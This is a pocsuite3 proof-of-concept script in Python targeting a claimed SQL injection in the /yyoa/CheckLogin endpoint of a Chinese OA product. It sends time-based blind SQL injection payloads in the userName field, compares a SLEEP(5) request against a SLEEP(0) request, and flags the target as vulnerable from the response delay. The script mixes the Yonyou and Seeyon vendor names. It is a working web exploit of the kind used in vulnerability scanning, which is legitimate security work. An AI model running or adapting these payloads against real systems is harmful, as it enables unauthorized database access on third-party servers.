from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict

class TestPOC(POCBase):
    vulID = '000'  # ssvid
    version = '1.0'
    name = '用友OA CheckLogin 存在SQL注入漏洞'
    appName = '用友OA'
    appVersion = 'All'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''北京致远互联软件股份有限公司 OA系统 CheckLogin 存在SQL注入漏洞，攻击者可利用该漏洞获取系统敏感信息等。'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):
        result = {}
        headers={
            'Content-Type': 'application/x-www-form-urlencoded',
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36"
        }
        path="/yyoa/CheckLogin"
        inject_data="userName=11' AND (SELECT 6355 FROM (SELECT(SLEEP(5)))sHcE) AND 'wert'='wert&loginit12=&password="
        base_data="userName=11' AND (SELECT 6355 FROM (SELECT(SLEEP(0)))sHcE) AND 'wert'='wert&loginit12=&password="
        vulur1 = self.url+path
        base_resp = requests.post(vulur1,headers=headers,data=base_data,verify=False,timeout=10)
        inject_resp = requests.post(vulur1,headers=headers,data=inject_data,verify=False,timeout=10)
        base_time = base_resp.elapsed.total_seconds()
        inject_time = inject_resp.elapsed.total_seconds()
        if (inject_time - base_time) >= 4.5 and (inject_time - base_time) <= 5.5 and base_resp.status_code ==200 and  inject_resp.status_code== 200 and "alert('登录名错误，查无此人！" in inject_resp.text:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = vulur1
        return self.parse_output(result)

    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(TestPOC)
